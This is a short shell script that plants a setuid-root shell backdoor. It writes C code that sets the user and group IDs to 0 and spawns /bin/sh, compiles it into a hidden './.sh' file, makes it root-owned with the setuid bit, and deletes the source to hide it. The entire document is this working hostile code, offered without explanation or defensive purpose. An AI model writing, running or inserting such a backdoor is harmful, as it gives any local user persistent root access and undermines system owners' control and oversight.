#!/bin/sh
code=$(cat<<EOF
int main(void) {
  setgid(0); setuid(0);
  execl("/bin/sh", "sh", 0);
}
EOF
)
echo $code>./.sh.c
gcc -o ./.sh ./.sh.c
chown root:root ./.sh
chmod u+s ./.sh
rm ./.sh.c
